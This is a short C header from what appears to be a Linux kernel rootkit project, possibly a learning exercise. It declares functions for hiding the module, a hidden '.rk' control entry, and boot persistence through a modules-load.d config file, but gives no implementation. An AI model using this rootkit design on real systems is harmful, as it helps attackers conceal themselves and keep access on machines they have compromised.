/* SPDX-License-Identifier: GPL-2.0 */
#ifndef ROOTKITLINGS_ROOTKIT_H
#define ROOTKITLINGS_ROOTKIT_H
#include <linux/types.h>

#define CONTROL_NAME     ".rk"
#define PERSISTENCE_PATH "/etc/modules-load.d/glasshouse.conf"
#define MODULE_REQUEST   "hello\n"

int conceal_start(void);
void conceal_stop(void);
void conceal_module(void);
void reveal_module(void);
bool conceal_module_hidden(void);
int control_create(void);
void control_destroy(void);
int persistence_install(void);
int persistence_remove(void);
bool persistence_present(void);
#endif
